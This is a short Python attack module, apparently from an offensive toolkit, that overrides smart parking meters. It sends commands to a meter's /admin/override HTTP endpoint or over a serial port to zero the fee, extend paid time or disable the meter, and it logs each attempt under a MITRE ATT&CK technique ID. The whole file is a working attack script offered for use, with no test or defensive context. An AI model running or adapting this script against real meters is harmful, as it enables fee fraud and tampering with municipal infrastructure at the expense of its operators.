#!/usr/bin/env python3
# modules/attacks/smart_parking_meter_override.py

import os
import json
import time
import argparse
from datetime import datetime
import requests
import serial

LOG_FILE = "results/parking_meter_override_log.json"
MITRE_TTP = "T1496"

def log_action(method, target, action):
    os.makedirs("results", exist_ok=True)
    log = {
        "timestamp": datetime.utcnow().isoformat(),
        "method": method,
        "target": target,
        "action": action,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log) + "\n")

def override_http(ip, action):
    try:
        url = f"http://{ip}/admin/override"
        data = {"action": action}
        r = requests.post(url, json=data, timeout=5)
        if r.status_code == 200:
            print(f"[✓] Override '{action}' sent to {ip}")
            log_action("HTTP", ip, action)
        else:
            print(f"[!] HTTP override failed. Code: {r.status_code}")
    except Exception as e:
        print(f"[!] Error: {e}")

def override_serial(port, action):
    try:
        with serial.Serial(port, 9600, timeout=1) as s:
            s.write((action + "\n").encode())
            log_action("Serial", port, action)
            print(f"[✓] Serial override '{action}' sent via {port}")
    except Exception as e:
        print(f"[!] Serial override error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Override or disable smart parking meters")
    parser.add_argument("--method", choices=["http", "serial"], required=True)
    parser.add_argument("--target", required=True, help="IP address or serial port")
    parser.add_argument("--action", choices=["zero_fee", "extend", "disable"], required=True)
    args = parser.parse_args()

    if args.method == "http":
        override_http(args.target, args.action)
    elif args.method == "serial":
        override_serial(args.target, args.action)
